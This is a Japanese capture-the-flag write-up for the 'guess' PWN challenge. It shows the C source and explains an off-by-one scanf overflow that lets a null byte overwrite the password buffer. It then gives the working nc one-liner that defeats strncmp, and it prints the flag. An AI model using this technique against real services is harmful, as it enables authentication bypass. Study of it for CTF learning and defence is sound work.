# guess:PWN:356pts
Please guess my password.  
私のパスワードを推測してください。  
※総当たりする必要はございません。そういった行為はお控えください。  

`nc uectf.uec.tokyo 9001`  

[chall](chall)　[main.c](main.c)　[flag.txt](flag.txt)　[secret.txt](secret.txt)  

Hint  
32文字入力すると`pw`はどうなりますか？  
※改行文字にご注意ください。（文字列を送信する際は`echo -en`等を使うことをお勧めします。）  

# Solution
接続先とソース一式が与えられる。  
main.cを見ると以下のようであった。  
```C
#include <stdio.h>
#include <string.h>

void win() {
    char flag[0x20];
    FILE *fp = fopen("flag.txt", "r");
    fgets(flag, 32, fp);
    puts(flag);
    fclose(fp);
}

void secret(char *s) {
    FILE *fp = fopen("secret.txt", "r");
    fgets(s, 32, fp);
    fclose(fp);
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char buf[32];
    char pw[32];

    secret(pw);

    printf("Guess my password\n> ");
    scanf("%32s", buf);
    if(strncmp(pw, buf, sizeof(pw)) == 0) {
        puts("Correct!!!");
        win();
    } else {
        puts("Wrong.");
    }
    return 0;
}
```
`strncmp`を突破すればフラグが表示されるようだ。  
ヌルバイト系だろうとあたりをつけ以下のようにローカルで遊んでいると刺さったが、リモートでは効果がない。  
```bash
$ python -c 'print("\x00" * 100)' | ./chall
Guess my password
> Correct!!!
flag{fake_flag}

$ python -c 'print("\x00" * 100)' | nc uectf.uec.tokyo 9001
Guess my password
> $
```
ここで`buf[32]`に32文字読み取っていることに気づく。  
scanfによって追加されたヌルバイトがはみ出し、`pw`を汚染することで、`buf`の先頭がヌルバイトであった場合、`strncmp`が0となる。  
以下のようにちょうどで行えばよい。  
```bash
$ python -c 'print("\x00" * 32, end="")' | nc uectf.uec.tokyo 9001
Guess my password
> Correct!!!
UECTF{Wow_are_you_Esper?}
```
flagが得られた。  

## UECTF{Wow_are_you_Esper?}